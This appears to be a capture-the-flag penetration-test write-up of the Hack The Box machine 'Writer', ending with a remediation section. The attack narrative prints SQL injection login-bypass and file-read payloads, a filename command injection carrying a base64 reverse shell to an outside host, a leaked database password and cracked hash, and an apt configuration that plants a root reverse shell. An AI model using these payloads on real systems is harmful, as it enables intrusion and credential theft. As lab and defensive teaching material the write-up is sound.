title:  Writer Writeup
description: This system contained an SQL injection vulnerability which could be leveraged to not only log into an application with admin privileges, but also could be used to read local files on the target. After leaking the source code of the website, an insecure usage of handling files was exploited to get RCE. With a www-data shell on the system, an insecure password of a local user located in the SQL database was cracked. Eventually the system was fully compromised through misconfigurations relating to SMTP and APT.

The username field is vulnerable to a critical SQL injection, which an attacker could leverage to login as an administrative user, access sensitive local files, and extract usernames and password hashes.\n\nFollowing the authentication bypass, an insecure image upload feature could be exploited to gain RCE on the target. After obtaining a shell as the www-data user, escalating privileges to the local kyle user could be done by way of cracking his hash in the dev SQL database. The kyle user was part of the filter group which allowed for editing the configuration files of the SMTP service running locally on port 25. Because this service was running as the john user, getting a shell via the service resulted in compromising his account.\n\nFinally, the john user is part of the management group which has access to the apt repository configuration files. A cronjob running as root which performed a frequent apt-get update command could therefore be taken advantage of, and obtaining root privileges was possible through adding a reverse shell file in the apt configurations. Please view the [Post Exploitation Analysis](#h.ui1gvqou6arf) and [Conclusion](#h.m32hn92j9nqq) sections to see remediations for these vulnerabilities\n\nAttack Narrative\n================\n\nNo information was provided prior to this engagement, other than the IP address of the target: 10.10.11.101.\n\nEnumeration\n-----------\n\n### Port Enumeration\n\nTo examine potential vulnerabilities, the ports of the target were first scanned:\n\n{% highlight bash %}\n# Nmap 7.91 scan initiated Tue Aug 17 14:52:04 2021 as: nmap -sC -sV -oA nmap/nmap 10.10.11.101  \nNmap scan report for 10.10.11.101  \nHost is up (0.065s latency).  \nNot shown: 996 closed ports  \nPORT    STATE SERVICE     VERSION  \n22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)  \n| ssh-hostkey:  \n|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)  \n|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)  \n|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)  \n80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))  \n|_http-server-header: Apache/2.4.41 (Ubuntu)  \n|_http-title: Story Bank | Writer.HTB  \n139/tcp open  netbios-ssn Samba smbd 4.6.2  \n445/tcp open  netbios-ssn Samba smbd 4.6.2  \nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  \n  \nHost script results:  \n|_clock-skew: 32s  \n|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)  \n| smb2-security-mode:  \n|   2.02:  \n|_    Message signing enabled but not required  \n| smb2-time:  \n|   date: 2021-08-17T19:52:51  \n|_  start_date: N/A  \n  \nService detection performed.

The SMB service is of interest, however there is no anonymous access to any of the shares:\n\n![](/reports/Writer/image1.png)\n\nSeeing as all of the services are up to date, it follows that the HTTP service must be searched for potential vulnerabilities.\n\n### Web Enumeration\n\nUsers visiting the target’s web server are met with the following home page:\n\n![](/reports/Writer/image4.png)\n\nEnumerating the directories of the webpage with gobuster[[1]](#ftnt1), the following directories are found:\n\n{% highlight bash %}\n/contact              (Status: 200) [Size: 4905]  \n/logout               (Status: 302) [Size: 208] [--> http://10.10.11.101/]  \n/about                (Status: 200) [Size: 3522]  \n/static               (Status: 301) [Size: 313] [--> http://10.10.11.101/static/]  \n/.

Visiting this directory reveals a simple login form which asks for a username and password:\n\n![](/reports/Writer/image2.png)\n\nNote the domain of the target (namely writer.htb). However, no virtual host routing is present.\n\nSQL Injection\n-------------\n\nWhen inputting ’OR 1=1-- - as the username and choosing a random value for the password, the user is automatically authenticated, thus confirming the presence of SQL injection. As an authenticated user, stories can be edited and created, and pictures can be uploaded:\n\n![](/reports/Writer/image5.png)\n\nThe web page does not properly check if an uploaded file is an image, as it was possible to upload a reverse shell by the name of php-reverse-shell.jpg.php. This, however, did not lead to RCE as the web page nevertheless treated the file as an image. Furthermore, uploading a malicious image with PHP code did not work.\n\nAn addition to the image upload feature is the ability to upload files given a url. This could be utilized to cause the server to perform GET requests to an arbitrary website of the user’s choice:\n\nRequest\n\n{% highlight bash %} \nPOST /dashboard/stories/add HTTP/1.1Host: 10.10.11.101  \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0  \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  \nAccept-Language: en-US,en;q=0.5  \nAccept-Encoding: gzip, deflate  \nContent-Type: multipart/form-data; boundary=---------------------------12417370376638841362770592069  \nContent-Length: 850  \nOrigin: http://10.10.11.101  \nDNT: 1  \nConnection: close  \nReferer: http://10.10.11.101/dashboard/stories/add  \nCookie: session=eyJ1c2VyIjoiJ09SIDE9MS0tIC0ifQ.YSLw7w.2OHVWSzrpZAobEiyfxo94ul3lfg  \nUpgrade-Insecure-Requests: 1  \nSec-GPC: 1  \n  \n-----------------------------12417370376638841362770592069  \nContent-Disposition: form-data; name=\"author\"  \n  \n0xd4y  \n-----------------------------12417370376638841362770592069  \nContent-Disposition: form-data; name=\"title\"  \n  \nWriteup  \n-----------------------------12417370376638841362770592069  \nContent-Disposition: form-data; name=\"tagline\"  \n  \nWriteup  \n-----------------------------12417370376638841362770592069  \nContent-Disposition: form-data; name=\"image\"; filename  \nContent-Type: application/octet-stream  \n  \n  \n-----------------------------12417370376638841362770592069  \nContent-Disposition: form-data; name=\"image_url\"  \n  \nhttp://10.10.15.80/image.jpg  \n-----------------------------12417370376638841362770592069  \nContent-Disposition: form-data; name=\"content\"Thanks for reading!  \n-----------------------------12417370376638841362770592069--\n{% endhighlight %}\n\nNote the “image_url” parameter highlighted in red  \n\nResponse\n\n{% highlight bash %}\n┌─[✗]─[0xd4y@Writeup]─[~/business/hackthebox/medium/linux/writer]  \n└──╼ $sudo nc -lvnp 80  \nlistening on [any] 80 ...  \nconnect to [10.10.15.80] from (UNKNOWN) [10.10.11.101] 38018GET /image.jpg HTTP/1.1  \nAccept-Encoding: identityHost: 10.10.15.80  \nUser-Agent: Python-urllib/3.8  \nConnection: close\n{% endhighlight %}\n\nJudging from the user-agent, it was found that the server is running python. After failing to obtain code executions despite trying many different upload attacks, it follows that the source code of the upload feature must be leaked to determine how it works.\n\n### Leveraging SQLi to Read Local Files\n\nThis is possible via the load_file SQL function. Going back to the login page, this function can be used in conjunction with a union select statement to leak files:\n\nPayload\n\n{% highlight bash %}\nuname=\'union select 1,load_file(\'/etc/passwd\'),3,4,5,6-- -&password=a\n{% endhighlight %}\n\nResponse\n\n{% highlight bash %}\nWelcome root:x:0:0:root:/root:/bin/bash  \ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  \nbin:x:2:2:bin:/bin:/usr/sbin/nologin  \nsys:x:3:3:sys:/dev:/usr/sbin/nologin  \nsync:x:4:65534:sync:/bin:/bin/sync  \ngames:x:5:60:games:/usr/games:/usr/sbin/nologin  \nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin  \nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  \nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin  \nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin  \nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  \nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin  \nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  \nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin  \nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  \nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin  \ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  \nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  \nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin  \nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  \nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  \nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin  \nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin  \n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin  \ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false  \nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin  \ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin  \nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin  \npollinate:x:110:1::/var/cache/pollinate:/bin/false  \nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin  \nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin  \nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  \nkyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash  \nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false  \npostfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin  \nfilter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh  \njohn:x:1001:1001:,,,:/home/john:/bin/bash  \nmysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false\n{% endhighlight %}\n\nGetting RCE\n-----------\n\n### Source Code Analysis\n\nBefore being able to read the source code of the website, the full path of the file containing the source code must first be discovered. Seeing as the server is running apache2, the 000-default.conf file in the /etc/apache2/sites-available directory, a directory which holds configuration files for Apache virtual hosts, can be leaked to determine this information.  \n\nPayload\n\n{% highlight bash %}\nuname=\'union select 1,load_file(\'/etc/apache2/sites-available/000-default.conf\'),3,4,5,6-- -&password=a\n{% endhighlight %}\n\n  \nResponse\n\n{% highlight bash %}\nWelcome # Virtual host configuration for writer.htb domain  \n&lt;VirtualHost *:80&gt;  \n       ServerName writer.htb  \n       ServerAdmin admin@writer.htb  \n       WSGIScriptAlias / /var/www/writer.htb/writer.wsgi       &lt;Directory /var/www/writer.htb&gt;  \n               Order allow,deny  \n               Allow from all  \n       &lt;/Directory&gt;  \n       Alias /static /var/www/writer.htb/writer/static       &lt;Directory /var/www/writer.htb/writer/static/&gt;  \n               Order allow,deny  \n               Allow from all  \n       &lt;/Directory&gt;  \n       ErrorLog ${APACHE_LOG_DIR}/error.log  \n       LogLevel warn  \n       CustomLog ${APACHE_LOG_DIR}/access.log combined  \n&lt;/VirtualHost&gt;  \n  \n# Virtual host configuration for dev.writer.htb subdomain  \n# Will enable configuration after completing backend development  \n# Listen 8080  \n#&lt;VirtualHost 127.0.0.1:8080&gt;  \n#        ServerName dev.writer.htb  \n#        ServerAdmin admin@writer.htb  \n#       # Collect static for the writer2_project/writer_web/templates#        Alias /static /var/www/writer2_project/static  \n#        &lt;Directory /var/www/writer2_project/static&gt;  \n#                Require all granted  \n#        &lt;/Directory&gt;  \n#  \n#        &lt;Directory /var/www/writer2_project/writerv2&gt;  \n#                &lt;Files wsgi.py&gt;  \n#                        Require all granted  \n#                &lt;/Files&gt;  \n#        &lt;/Directory&gt;  \n#  \n#        WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env  \n#        WSGIProcessGroup writer2_project  \n#        WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py  \n#        ErrorLog ${APACHE_LOG_DIR}/error.log  \n#        LogLevel warn  \n#        CustomLog ${APACHE_LOG_DIR}/access.log combined  \n#  \n#&lt;/VirtualHost&gt;  \n# vim: syntax=apache ts=4 sw=4 sts=4 sr noet\n{% endhighlight %}\n\nIn particular, note the directory in which the writer.wsgi file lies in (highlighted in blue).

One that particularly stands out is the call of os.system on the uploaded filename. Before testing exploits on the target, the exploit was tested out locally to get a closer view as to how the program behaves. Copying the segment of interest, we can get a closer look at how the program treats file names:\n\nCode \n\n{% highlight python %}\nimport urllib  \nimport os  \nfrom flask import request  \n  \nlocal_filename, headers = urllib.request.urlretrieve(\'http://10.10.15.80/.jpg/1.jpg;sleep\')  \nprint(\"The local_filename is\", local_filename)  \nos.system(\"mv {} {}.jpg\".format(local_filename, local_filename))\n{% endhighlight %}\n\nObserve the argument of the urllib.request.urlretrieve() function. The user is in control of this argument. If a user were to upload a file called 1.jpg;sleep, then the server will behave accordingly:\n\n  \nResponse\n\nThe local_filename is /tmp/tmpen3ya1q1\n\nHowever, when changing the argument to be file:///home/0xd4y/business/hackthebox/medium/linux/writer/www/.jpg/1.jpg;sleep 10, then command execution is performed. This works because the urllib function does not correctly rename the file to something safe in the instance that the argument is using the file protocol. Therefore, a file with a malicious name can be uploaded using the image parameter, and this file can then be referenced locally via the file protocol.\n\n### Reverse Shell\n\nAfter uploading a file with the name `0xd4y.jpg;echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash`, it was referenced locally by putting the following in the image_url parameter: file:///var/www/writer.htb/writer/static/img/0xd4y.jpg;`echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash`. A reverse shell was then returned as the www-data user:\n\n{% highlight bash %}\n┌─[✗]─[0xd4y@Writeup]─[~/business/hackthebox/medium/linux/writer]└──╼ $nc -lvnp 9001  \nlistening on [any] 9001 ...  \nconnect to [10.10.15.80] from (UNKNOWN) [10.10.11.101] 59938  \n/bin/sh: 0: can\'t access tty; job control turned off  \n$ whoami  \nwww-data\n{% endhighlight %}\n\nPrivilege Escalation\n--------------------\n\n### Kyle\n\nAfter enumerating multiple files in the box, it was found that there is a username and password in a mysql config file called /etc/mysql/my.cnf that points to the dev database:\n\ndatabase = devuser = djangouser  \npassword = DjangoSuperPassword\n\nOne of Kyle’s passwords is located in the databases, albeit it is hashed:\n\npbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=. Cracking this hash reveals that Kyle’s password is marcoantonio.\n\n### John\n\nThe kyle user is part of multiple groups, one of them being the filter group which has permissions to edit the /etc/postfix/disclaimer file. Furthermore, after enumerating the ports running locally on the target, it was found that port 25 is open and running a Postfix SMTP server.\n\nWith pspy[[2]](#ftnt2) running on a separate kyle SSH instance, the following message was sent on the box:\n\nkyle@writer:~$ nc localhost 25  \n220 writer.htb ESMTP Postfix (Ubuntu)  \nMAIL FROM:kyle@writer.htb  \n250 2.1.0 Ok  \nRCPT TO: john@writer.htb  \n250 2.1.5 Ok  \nData  \n354 End data with <CR><LF>.<CR><LF>  \nThanks for reading this writeup!  \n.  \n250 2.0.0 Ok: queued as 9BB6F137\n\nUpon sending this message, the following process occurred in the background:\n\n2021/08/25 00:12:54 CMD: UID=1001 PID=23607  | /bin/sh /etc/postfix/disclaimer -f kyle@writer.htb -- john@writer.htb\n\nThus, the server is running as the john user (note UID=1001), and is executing the /etc/postfix/disclaimer file. Seeing as the kyle user had permission to edit this file, achieving a reverse shell as the john user could be obtained via appending a reverse shell to the top of the file and sending a message:\n\n┌─[0xd4y@Writeup]─[~/business/hackthebox/medium/linux/writer]└──╼ $nc -lvnp 9001  \nlistening on [any] 9001 ...  \nconnect to [10.10.15.80] from (UNKNOWN) [10.10.11.101] 49840  \n/bin/sh: 0: can\'t access tty; job control turned off  \n$ whoami  \njohn\n\nPersistence on this account was maintained by grabbing john’s ssh key.\n\n### Root\n\nJohn is part of the management group which has permission to edit the apt directory /etc/apt/apt.conf.d, a directory which is responsible for containing the apt configurations. As discovered using pspy, there is a cronjob running as root which performs the following command: /usr/bin/apt-get update. Therefore, a malicious configuration that returns a reverse shell can be added to the directory as follows:\n\n{% highlight bash %}\njohn@writer:~$ echo \'apt::Update::Pre-Invoke {\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.80 9001 >/tmp/f\"};\' > /etc/apt/apt.conf.d/0xd4y-pwn\n{% endhighlight %}\n\nWhen the cronjob runs again, a reverse shell is returned as the root user:\n\n{% highlight bash %}\n┌─[✗]─[0xd4y@Writeup]─[~/business/hackthebox/medium/linux/writer]└──╼ $nc -lvnp 9001  \nlistening on [any] 9001 ...  \nconnect to [10.10.15.80] from (UNKNOWN) [10.10.11.101] 56068  \n/bin/sh: 0: can\'t access tty; job control turned off  \n# whoami  \nroot\n{% endhighlight %}\n\nPost Exploitation Analysis\n==========================\n\n* * *\n\nThis section goes into further detail about the vulnerabilities of the target and how to mitigate them. Note that the mitigations shown in this section are incomplete pieces of code, however they are secure implementations of the desired result.\n\nSQLi Mitigation (PDO)\n---------------------\n\nThis machine contained multiple vulnerabilities, starting with the SQL injection in the /administrative page. The vulnerability lies in the following SQL statement that is performed on the user’s query:\n\n{% highlight sql %}\n\"Select * From users Where username = \'%s\' And password = \'%s\'\" % (username, password)\n{% endhighlight %}\n\nThis insecure SQL statement allows an attacker to add a single quote in their username and then perform an arbitrary SQL statement of their choosing. To mitigate SQL injection attacks, the current recommendation is to use PDO (PHP Data Objects). The following code does not directly pass the user input into the SQL statement. Rather, using PDO tells the server what the SQL query and the user-inputted data are. This is successfully performed because the instruction and user-input are sent separately to the database:\n\n{% highlight php %}\n<?php  \n  \ntry {  \n  \n $conn = new PDO(\"mysql:host=$servername;dbname=$dbname\", $db_username, $db_password); // set the PDO error mode to exception $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); // prepare sql and bind parameters        $query = \"INSERT INTO users (username,password)  VALUES(:username,:password)\";  \n        $statement = $conn->prepare($query);  \n        $statement->execute(array(   \':username\'=> $username,   \':password\'=> $password  \n        ));  \n  \n} catch(PDOException $e) { echo \"Error: \" . $e->getMessage();  \n}  \n$conn = null;  \n  \n?>\n{% endhighlight %}\n\nImage Upload (RCE)\n------------------\n\nAfter successfully performing an SQL injection attack, an upload feature in the webpage was exploited to gain RCE due to insecure python code. System commands and evaluation functions should never be performed on user input. As discussed in [Finding RCE Vulnerability](#h.eswqky3qu6hx), the system() function in the os module was the reason for the critical RCE vulnerability. The following code prevents this vulnerability:\n\n{% highlight python %}\nfrom werkzeug.utils import secure_filename\n\nfrom PIL import Image  \n  \nfilename = request.file(\'image\')  \n  \nimage = StringIO(base64.b64decode(download[\'file\']))  \nallowed_extensions = [\'jpg\',\'jpeg\']  \nif filename.split(\'.\')[-1] in allowed_extensions:        \n\t\t\t\ttry:  \n                filename = secure_filename(filename)  \n  \n                img = Image.open(image)  \n                img.verify()  \n                path = os.path.join(\'/var/www/writer.htb/writer/static/img/\', filename)                image.save(path)  \n        except Exception:                print(\'Invalid image\')  \nelse:        \n\t\t\t\t\t\t\t\tprint(\'Filename extension not allowed.\')\n{% endhighlight %}\n\nThe above program verifies if a file is a valid image by first checking its extension. Note that this is different from the source code of the website which simply searches for the presence of the .jpg string in the filename. After verifying the file’s extension, PIL’s verify method is called on the file before the file is uploaded to the img directory.\n\nConclusion\n==========\n\n* * *\n\nMultiple vulnerabilities were present on the target which resulted in a full compromise of the system. The /administrative page contained an SQL injection vulnerability which resulted in the leakage of local files and authentication bypass. After authenticating to the server, the insecure handling of filenames led to an RCE vulnerability.\n\nAfterwards, the privilege escalation to root involved logging into the system as the kyle user who had permissions to edit the mail service. Due to the service running under john, the lateral movement involved adding a reverse shell to the configuration of the service. As the john user, apt configurations could be modified to exploit an apt-get update cronjob running as the root user. Observe the following remediations to mitigate the vulnerabilities outlined in the report:\n\n*   Secure the SQL login page on /administrative\n\n*   PDO should be used in place of the insecure SQL statement (see [SQLi Mitigation (PDO)](#h.nw8pksu8e5re)).\n\n*   Never use system() or any sort of evaluation function on user-input.\n\n*   The system command on the uploaded filename resulted in RCE.\n\n*   Never reuse passwords\n\n*   As the www-data user, kyle’s password could be retrieved by cracking his hash from the dev database. This would not have been of much use if the local kyle user had a different password on the target.\n*   Passwords should be secure.\n\n*   Fix misconfigurations related to the kyle and john user\n\n*   kyle was able to edit a service that was run by john. To mitigate this, the service should either be run by kyle, or kyle should not have permissions to edit the service.\n*   john was able to edit apt configurations. This sort of privilege should not be granted to any user. By adding a reverse shell to the apt configurations, any user who runs the apt command can be compromised by john.\n\n* * *\n\n[[1]](#ftnt_ref1) [https://github.com/OJ/gobuster](https://www.google.com/url?q=https://github.com/OJ/gobuster&sa=D&source=editors&ust=1653773864860204&usg=AOvVaw0G3ZxMquY9ovsHERwv9Wfu) \n\n[[2]](#ftnt_ref2) [https://github.com/DominicBreuker/pspy](https://www.google.com/url?q=https://github.com/DominicBreuker/pspy&sa=D&source=editors&ust=1653773864860599&usg=AOvVaw1i07HkYHN5cp3nF3SIrdC1)\n
